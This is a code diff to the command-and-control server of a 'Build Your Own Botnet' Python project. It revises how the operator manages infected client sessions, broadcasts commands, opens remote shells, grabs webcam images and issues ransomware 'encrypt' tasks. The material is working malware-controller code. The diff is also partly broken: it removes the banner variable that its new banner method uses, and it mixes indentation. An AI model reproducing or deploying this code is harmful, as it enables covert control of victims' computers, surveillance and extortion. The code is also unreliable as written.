@@ -1,20 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 'Command & Control (Build Your Own Botnet)'
-__banner__ = """
-
-88                                  88
-88                                  88
-88                                  88
-88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
-88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
-88       d8  `8b   d8'  8b       d8 88       d8
-88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
-8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
-                d8'
-               d8'
-
-"""
 
 # standard library
 import os
@@ -35,7 +21,9 @@ import subprocess
 import collections
 
 # modules
-from core import *
+import core.util as util
+import core.database as database
+import core.security as security
 
 # globals
 packages = ['cv2','colorama','SocketServer']
@@ -43,7 +31,7 @@ platforms = ['win32','linux2','darwin']
 
 # setup
 util.is_compatible(platforms, __name__)
-util.imports(packages, __builtins__)
+util.imports(packages, globals())
 
 # globals
 __threads = {}
@@ -67,9 +55,9 @@ try:
     import colorama
     colorama.init(autoreset=True)
 except ImportError:
-   util.__logger__.debug("installing required Python package 'colorama'...")
+   util.log("installing required Python package 'colorama'...")
    execfile('setup.py')
-   util.__logger__.debug("restarting...")
+   util.log("restarting...")
    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
 
 # main
@@ -210,12 +198,6 @@ class C2():
                 'usage': 'tasks [id]',
                 'description': 'display all incomplete tasks for a client (default: all clients)'}}
 
-    def _error(self, data):
-        lock = self.current_session._lock if self.current_session else self._lock
-        with lock:
-            util.display('[-] ', color='red', style='normal', end=',')
-            util.display('Server Error: {}\n'.format(data), color='white', style='normal')
-
     def _print(self, info):
         lock = self.current_session._lock if self.current_session else self._lock
         if isinstance(info, str):
@@ -252,27 +234,19 @@ class C2():
         with lock:
             if data:
                 util.display('\n{}\n'.format(data))
-            else:
-                util.display(prompt, end=',')
+            util.display(prompt, end=',')
 
     def _banner(self):
-        try:
-            banner = __doc__ if __doc__ else "Command & Control Server (Build Your Own Botnet)"
-            with self._lock:
-                util.display(banner, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
-                util.display("[?] ", color='yellow', style='bright', end=',')
-                util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
-            return banner
-        except Exception as e:
-            util.__logger__.error(str(e))
+        with self._lock:
+            util.display(__banner__, color=random.choice(['red','green','cyan','magenta','yellow']), style='bright')
+            util.display("[?] ", color='yellow', style='bright', end=',')
+            util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
+        return __banner__
 
     def _get_arguments(self, data):
-        args = tuple([i for i in data.split() if '=' not in i])
-        kwds = dict({i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i})
+        args = tuple([i.strip('-') for i in str(data).split() if '=' not in i])
+        kwds = dict({i.partition('=')[0].strip('-'): i.partition('=')[2].strip('-') for i in str(data).split() if '=' in i})
         return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)
-
-    def _get_sessions(self):
-        return [v for v in self.sessions.values()]
 
     def _get_session_by_id(self, session):
         session = None
@@ -281,19 +255,21 @@ class C2():
         elif self.current_session:
             session = self.current_session
         else:
-            util.__logger__.error("Invalid Client ID")
+            util.log("Invalid Client ID")
         return session
 
     def _get_session_by_connection(self, connection):
         session = None
         if isinstance(connection, socket.socket):
-            _addr = connection.getpeername()
+            peer = connection.getpeername()[0]
             for s in self.get_sessions():
-                if s.connection.getpeername() == _addr:
-                    session = c
+                if s.connection.getpeername()[0] == peer:
+                    session = s
                     break
+            else:
+                util.log("session not found for: {}".format(peer))
         else:
-            util.__logger__.error("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
+            util.log("Invalid input type (expected '{}', received '{}')".format(socket.socket, type(connection)))
         return session
 
     def _get_prompt(self, data):
@@ -302,7 +278,7 @@ class C2():
 
     def eval(self, code):
         """ 
-        Runs code in context of the server
+        Execute code directly in the context of the currently running process
 
         `Requires`
         :param str code:    Python code to execute
@@ -312,9 +288,9 @@ class C2():
             try:
                 print eval(code)
             except Exception as e:
-                util.__logger__.error("Error: %s" % str(e))
+                util.log("Error: %s" % str(e))
         else:
-            util.__logger__.error("Debugging mode is disabled")
+            util.log("Debugging mode is disabled")
 
     def quit(self):
         """ 
@@ -324,7 +300,7 @@ class C2():
         if self._get_prompt('Quiting server - keep clients alive? (y/n): ').startswith('y'):
             globals()['package_handler'].terminate()
             globals()['module_handler'].terminate()
-            for session in self._get_sessions():
+            for session in self.sessions.values():
                 session._active.set()
                 session.send_task('mode passive')
         globals()['__abort'] = True
@@ -376,7 +352,7 @@ class C2():
                 except:
                     util.display(str(info), color=self._text_color, style=self._text_style)
             else:
-                util.__logger__.error("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
+                util.log("{} error: invalid data type '{}'".format(self.display.func_name, type(info)))
 
     def query(self, statement):
         """ 
@@ -486,8 +462,15 @@ class C2():
         :param str command:   command to broadcast
 
         """
-        for session in self._get_sessions():
-            session.send_task(command, session=session.id)
+        sessions = self.sessions.values()
+        send_tasks = [session.send_task(command) for session in sessions]
+        recv_tasks = {session: session.recv_task() for session in sessions}
+        for session, task in recv_tasks.items():
+            if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
+                session._prompt = task.get('result')
+            elif task.get('result'):
+                self.display(task.get('result'))
+        self._return()
 
     def session_webcam(self, args=''):
         """ 
@@ -498,7 +481,7 @@ class C2():
 
         """
         if not self.current_session:
-            util.__logger__.error( "No client selected")
+            util.log( "No client selected")
             return
         client = self.current_session
         result = ''
@@ -618,9 +601,9 @@ class C2():
             elif 'encrypt' in str(args):
                 self.current_session.send_task("ransom %s" % args)
             else:
-                util.__logger__.error("Error: invalid option '%s'" % args)
+                util.log("Error: invalid option '%s'" % args)
         else:
-            util.__logger__.error("No client selected")
+            util.log("No client selected")
 
     def session_shell(self, session):
         """ 
@@ -631,7 +614,7 @@ class C2():
 
         """
         if not str(session).isdigit() or int(session) not in self.sessions:
-            util.__logger__.error("Session '{}' does not exist".format(session))
+            util.log("Session '{}' does not exist".format(session))
         else:
             self._active.clear()
             if self.current_session:
@@ -869,8 +852,8 @@ class Session(threading.Thread):
                             break
                     self._prompt = None
             except Exception as e:
-		util.__logger__.error(str(e))
-		globals()['c2'].session_remove(self.id)
+        		util.log(str(e))
+        		globals()['c2'].session_remove(self.id)
                 time.sleep(1)
                 break
         self._active.clear()
